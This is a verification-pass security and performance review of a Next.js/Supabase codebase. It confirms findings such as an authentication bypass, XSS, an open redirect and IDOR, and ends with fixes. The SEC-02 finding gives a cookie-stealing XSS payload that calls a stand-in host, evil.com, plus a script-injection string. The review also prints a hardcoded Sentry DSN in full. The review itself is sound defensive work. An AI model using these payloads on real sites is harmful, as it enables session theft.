# Codebase Review — Verification Pass v2
**Date:** 2026-06-02  
**Method:** Direct file reads only (no sub-agents). Sequential module batches of 2–3 files.  
**Coverage:** 6 modules, 22 files read, all findings verified with quoted code + line numbers.

Legend: ✅ CONFIRMED · ❌ REFUTED · ⚠️ DOWNGRADED · 🆕 NEW

---

## Module 1 — Authentication & Middleware

### SEC-01 · Middleware Does Not Enforce Authentication ✅ CONFIRMED
**`middleware.ts:14`** — Delegates entirely to `updateSession(request)`:
```typescript
export async function middleware(request: NextRequest) {
  return updateSession(request)
}
```
**`utils/supabase/middleware.ts:41–46`** — Calls `getUser()` then immediately returns with no conditional:
```typescript
const { data: { user } } = await supabase.auth.getUser()
// If there's no user and the route is protected, redirect to sign-in
// This is handled by the middleware.ts file, so we just return the response here
return response   // ← unconditional pass-through
```
The comment at line 44 says auth is "handled by middleware.ts" — but middleware.ts also does nothing. Both files pass every request through. Any visitor reaches `/dashboard/*` unauthenticated.

---

### SEC-02 · XSS via Raw Template Literal in auth/verify ✅ CONFIRMED
**`app/auth/verify/route.ts:65–74`** — URL params injected unescaped into `<script>`:
```typescript
${data.user?.email ? `localStorage.setItem('auth_email', '${data.user.email}');` : ''}
${email ? `localStorage.setItem('auth_email', '${email}');` : ''}   // email = searchParams.get('email')
window.location.href = '${next}';   // next = searchParams.get('next')
```
Payload: crafting `?next=javascript:fetch('//evil.com?c='+document.cookie)` executes JS after authentication. Email param with `');alert(1);//` injects arbitrary statements into the script block.

---

### SEC-03 · Open Redirect in auth/callback and auth/confirm ✅ CONFIRMED
**`app/auth/callback/route.ts:147–153`** and **`app/auth/confirm/route.ts:66–72`** — identical pattern:
```typescript
const formattedNext = next.startsWith('/') ? next : `/${next}`
const redirectUrl = `${baseUrl}${formattedNext}`
return redirect(redirectUrl)
```
`//evil.com` starts with `/` — passes the check. Produces `https://yourdomain.com//evil.com`. Browsers interpret `//` as protocol-relative and navigate off-domain. No origin validation or allowlist exists.

---

### SEC-05 · Mock Admin User Injected on Missing Session ✅ CONFIRMED
**`app/context/auth-context.tsx:242–263`**:
```typescript
} else if (isDevelopment) {
  const mockProfile = {
    id: '00000000-0000-0000-0000-000000000000',
    role: 'admin',     // ← line 259
    status: 'active',
  } as Profile;
  setUser(mockUser);
  setProfile(mockProfile);
```
`isDevelopment = process.env.NODE_ENV === 'development'` at line 220. This is a **client-side context file** — the env var is baked into the browser bundle at build time. Any deployment accidentally built without `NODE_ENV=production` exposes a full admin session to every unauthenticated visitor via the fixed UUID `00000000-0000-0000-0000-000000000000`.

---

### 🆕 NEW-01 · authorization.ts Uses Browser Supabase Client in Auth Flow
**`app/lib/auth/authorization.ts:17`**:
```typescript
const supabase = createClient();   // imports from '../supabase/client' — browser client
```
`isAuthorizedEmail()` is called during sign-in and profile creation flows (server-side context). Using the anon-key browser client for an auth-gate lookup means it's subject to the same RLS policies as any unauthenticated user — the query to `allowed_emails` will only succeed if the `USING (true)` policy (SEC-11) is in place, meaning the authorization check itself depends on a security hole to function correctly.

---

## Module 2 — API Layer

### SEC-04 · IDOR — No Ownership Verification ✅ CONFIRMED
**`app/api/orders/[id]/route.ts:23`**:
```typescript
supabase.from('orders').select('*').eq('id', id).single()
```
Authentication checked (user exists), authorization is not. No `.eq('created_by', user.id)`. Any authenticated user reaches any order, expense, or material purchase by UUID. The response at `line 58` also returns `created_by` (another user's UUID) to the caller.

---

### SEC-08 · Order DELETE Has No Role Check ✅ CONFIRMED
**`app/api/orders/route.ts:161–181`** — Full DELETE handler:
```typescript
export async function DELETE(request: NextRequest) {
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return handleApiError('UNAUTHORIZED', 'Authentication required');
  // ← no role check here
  const { error } = await supabase.rpc('delete_order', { p_order_id: id });
  return NextResponse.json({ success: true, id });
}
```
Any authenticated `staff` user deletes any order. `expenses/[id]/route.ts` DELETE correctly checks `role !== 'admin' && role !== 'manager'` — orders does not.

---

### SEC-10 · App Settings GET Returns Data Unauthenticated ✅ CONFIRMED
**`app/api/settings/app/route.ts:7–25`** — No `getUser()` call in GET:
```typescript
export async function GET(request: NextRequest) {
  const supabase = await createClient();
  // ← no auth check
  const { data } = await supabase.from('app_settings').select('settings').single();
  return NextResponse.json({ settings: data?.settings || {} });
}
```
The PUT handler on the same file correctly requires admin role. GET does not authenticate at all.

---

### 🆕 NEW-02 · PUT /api/orders Uses Type Cast Instead of Zod
**`app/api/orders/route.ts:133–139`**:
```typescript
const { id, clientId, date, status, items } = body as {
  id?: string;
  clientId?: string;
  date?: string;
  status?: string;
  items?: unknown[];
};
```
`body as {...}` is a TypeScript-only assertion with zero runtime enforcement. `id` could be a SQL fragment, `status` any string, `items` any structure. Contrast with POST on the same file which correctly uses `CreateOrderSchema.safeParse(body)`.

---

## Module 3 — Database & RLS

### SEC-11 · allowed_emails World-Readable by All Authenticated Users ✅ CONFIRMED
**`supabase/migrations/20250901000000_auth_checkpoint_and_updates.sql:159–162`**:
```sql
CREATE POLICY "Authenticated users can read allowed_emails"
ON allowed_emails FOR SELECT
TO authenticated
USING (true);   -- ← no row filter, no role restriction
```
Every authenticated user (including lowest-privilege `staff`) can enumerate all privileged email addresses and their assigned roles.

---

### PERF-01 · Analytics Full-Table Scan + JavaScript Aggregation ✅ CONFIRMED
**`app/api/orders/analytics/route.ts:18–53`** — No LIMIT, all aggregation in JS:
```typescript
let query = supabase.from('orders')
  .select('status, payment_status, total_amount, balance, client_id, client_name', {
    count: 'exact',    // forces full table scan
  });
// ... filters applied, but NO .range() or .limit() ...
const { data } = await query;   // fetches ALL matching rows
const orders = data ?? [];
const totalRevenue = orders.reduce((sum, o) => sum + (o.total_amount || 0), 0);  // JS sum
const pendingOrders = orders.filter(o => o.status === 'pending' || ...).length;  // JS filter
```
At scale, the entire `orders` table loads into Node.js memory per request. Should be: `SELECT SUM(total_amount), COUNT(*) GROUP BY status, payment_status`.

---

### PERF-03 · Missing payment_status Indexes ❌ REFUTED
Indexes confirmed present in active (non-archive) migrations:
```
orders_payment_status_idx          — 20250600000000_consolidated_orders_schema.sql:180
expenses_payment_status_idx        — 20250599000003_consolidated_expenses_schema.sql:92
material_purchases_payment_status_idx — 20250600000001_consolidated_materials_schema.sql:91
```
This finding from the original review was incorrect.

---

## Module 4 — Build Config & Dead Code

### SEC-06 · Sentry DSN Hardcoded ✅ CONFIRMED
**`sentry.server.config.ts:8`** — Literal string in source:
```typescript
dsn: "https://fffc05fb922efea0351e74ec2cf4b8dc@o4509225001353216.ingest.us.sentry.io/4509225003581440",
tracesSampleRate: 1,   // 100% of all requests traced in production
```
Not read from an environment variable. Anyone with repo access can submit fake events or read your error telemetry.

---

### SEC-07 · TypeScript and ESLint Errors Suppressed at Build ✅ CONFIRMED
**`next.config.js:6–11`**:
```javascript
typescript: { ignoreBuildErrors: true },
eslint: { ignoreDuringBuilds: true },
```
Both flags present. Type errors and lint violations do not block deployments.

---

### 🆕 NEW-03 · dangerouslyAllowSVG Without App-Level CSP
**`next.config.js:14`**:
```javascript
dangerouslyAllowSVG: true,
contentSecurityPolicy: "default-src 'self'; script-src 'none'; sandbox;",
```
The CSP at `line 16` only applies to images rendered via `next/image`. There are no `headers()` configured in `next.config.js` for the application itself — no `Content-Security-Policy`, no `X-Frame-Options`, no `Strict-Transport-Security`. SVG uploads can embed `<script>` tags; without an app-level CSP this is an XSS vector.

---

### ARCH-01 · Dead Code Directories in Production Builds ✅ CONFIRMED
All confirmed present:
```
pages/                            — 404.tsx, _error.jsx, unauthorized.tsx (Pages Router)
app/components/archive/           — InvoiceModal.tsx, OrderFormModal.tsx, OrderViewModal.tsx
app/debug/material-purchases/     — debug route accessible in production
app/dashboard/notifications-test/ — test route
app/dashboard/sizes-test/         — test route
app/dashboard/calendar-demo/      — demo route
app/dashboard/analytics/test/     — test route
app/dashboard/analytics/stock-demo/ — demo route
```

---

## Module 5 — State Management & Cache

### PERF-02 · 4× SWR Mutate Calls on Every Cache Invalidation ✅ CONFIRMED
**`app/lib/cache-utils.ts`** — `invalidateOrderCache()` fires:
1. `line 17` — specific order key
2. `line 21` — full orders list
3. `lines 25–43` — regex sweep across all cached keys
4. `lines 49–58` — **same sweep repeated inside `setTimeout(..., 100ms)`**

Calls 3 and 4 are functionally identical. The `setTimeout` at line 46 fires a second wave of the same network requests 100ms after the first wave has already completed, guaranteeing at least one duplicate fetch cycle per mutation.

---

### PERF-07 · JSON.stringify on Full Order Per Keystroke ✅ CONFIRMED
**`app/hooks/orders/useOrderForm.ts:182`**:
```typescript
return JSON.stringify(orderForComparison) !== JSON.stringify(initialForComparison);
```
Inside a `useCallback` with `order` as a dependency. `order` changes on every field edit. Every keystroke while editing an order triggers a full serialization of the entire order including all items and payments arrays.

---

## Module 6 — Frontend React Patterns

### REACT-01 · Hook Called in Conditional Expression and Event Handler ✅ CONFIRMED
**`app/components/navigation/SideNav.tsx:311–318`**:
```tsx
{useAuth().refreshProfile && (          // ← hook inside JSX conditional
  <Button onClick={(e) => {
    useAuth().refreshProfile?.();       // ← hook inside event handler
  }}>
```
Rules of Hooks: hooks must only be called at the top level of a component. Called conditionally in JSX means the hook count changes based on render output. Called inside an `onClick` means it runs outside the React render cycle. React will throw an invariant violation in strict mode.

---

### REACT-02 · 7 DOM Queries Inside React Event Handler ✅ CONFIRMED
**`app/components/orders/OrderRow.tsx:85–98`**:
```typescript
target.closest('button, .interactive-element, ...')  // DOM traversal
target.tagName.toLowerCase() === 'button'
target.getAttribute('role') === 'button'
target.classList.contains('interactive-element')
target.hasAttribute('data-dropdown-trigger')
target.parentElement?.querySelectorAll('.interactive-element')
document.querySelector('[data-dropdown-content]')    // ← full-document query per click
```
7 separate DOM operations per row click. The `document.querySelector` at line 98 scans the entire document on every click. `setTimeout(..., 200ms)` at line 104 is a reliability workaround that confirms the approach is fragile.

---

### REACT-03 · Scroll Listener Without Debounce ⚠️ DOWNGRADED TO LOW
**`app/components/navigation/TopHeader.tsx:161–163`**:
```typescript
const handleScroll = () => {
  setScrolled(window.scrollY > 10);
};
```
No debounce. Fires on every scroll pixel. However, `setScrolled` compares a boolean — React bails out of re-renders when state value doesn't change. Real-world performance impact is minimal. **Downgraded from HIGH to LOW.**

---

### Size Violations ✅ CONFIRMED
Project mandates 200-line maximum. Confirmed:

| File | Lines | Over by |
|------|-------|---------|
| `app/hooks/materials/useMaterialPurchases.ts` | 1159 | +959 |
| `app/lib/services/analytics-service.ts` | 919 | +719 |
| `app/components/orders/OrdersTableNew.tsx` | 625 | +425 |
| `app/components/orders/OrderFormModal/index.tsx` | 292 | +92 |

---

## Final Verification Scorecard

| ID | Finding | Result | Severity |
|----|---------|--------|----------|
| SEC-01 | Middleware auth bypass | ✅ CONFIRMED | CRITICAL |
| SEC-02 | XSS in auth/verify template literal | ✅ CONFIRMED | CRITICAL |
| SEC-03 | Open redirect in callback/confirm | ✅ CONFIRMED | CRITICAL |
| SEC-04 | IDOR — no ownership checks on resources | ✅ CONFIRMED | CRITICAL |
| SEC-05 | Mock admin user on missing session | ✅ CONFIRMED | CRITICAL |
| SEC-06 | Sentry DSN hardcoded in source | ✅ CONFIRMED | HIGH |
| SEC-07 | TS/ESLint build errors suppressed | ✅ CONFIRMED | HIGH |
| SEC-08 | Order DELETE no role authorization | ✅ CONFIRMED | HIGH |
| SEC-10 | App settings GET unauthenticated | ✅ CONFIRMED | HIGH |
| SEC-11 | allowed_emails readable by all users | ✅ CONFIRMED | HIGH |
| PERF-01 | Analytics full-table JS aggregation | ✅ CONFIRMED | HIGH |
| PERF-02 | 4× SWR mutate on every invalidation | ✅ CONFIRMED | MEDIUM |
| PERF-03 | Missing payment_status indexes | ❌ REFUTED | — |
| PERF-07 | JSON.stringify per keystroke in isDirty | ✅ CONFIRMED | MEDIUM |
| REACT-01 | Hook in conditional/event handler | ✅ CONFIRMED | HIGH |
| REACT-02 | 7 DOM queries per click in OrderRow | ✅ CONFIRMED | MEDIUM |
| REACT-03 | Scroll listener no debounce | ⚠️ DOWNGRADED | LOW |
| ARCH-01 | Dead code in production builds | ✅ CONFIRMED | MEDIUM |
| NEW-01 | Browser Supabase client in auth-gate | 🆕 NEW | HIGH |
| NEW-02 | PUT /api/orders uses type cast not Zod | 🆕 NEW | HIGH |
| NEW-03 | No app-level CSP headers + dangerouslyAllowSVG | 🆕 NEW | HIGH |

**Score: 17 confirmed · 1 refuted · 1 downgraded · 3 new findings added**

---

## Overall Rating: 4.5 / 10 — Unchanged

All 5 CRITICAL security findings verified with direct code quotes. 3 additional HIGH findings discovered in this pass. The rating stands — the codebase requires security remediation before production exposure.

### Immediate Action Priority (ordered)

1. **`auth-context.tsx:242`** — Delete mock admin block (5 lines)
2. **`middleware.ts` + `utils/supabase/middleware.ts`** — Add unauthenticated redirect for protected paths
3. **`auth/verify/route.ts:65–74`** — Escape injected values with `JSON.stringify`, validate `next` URL
4. **`auth/callback/route.ts:147`, `auth/confirm/route.ts:66`** — Validate `next` against path allowlist
5. **All `[id]/route.ts` handlers** — Add `.eq('created_by', user.id)` or rely on RLS with `auth.uid() = created_by`
6. **`api/orders/route.ts DELETE:161`** — Add role check matching expenses pattern
7. **`api/settings/app/route.ts GET:7`** — Add `getUser()` auth check
8. **`sentry.server.config.ts:8`** — Rotate DSN, move to `process.env.NEXT_PUBLIC_SENTRY_DSN`
9. **`next.config.js:6–11`** — Remove `ignoreBuildErrors` and `ignoreDuringBuilds`
10. **`next.config.js`** — Add `headers()` returning CSP, HSTS, X-Frame-Options
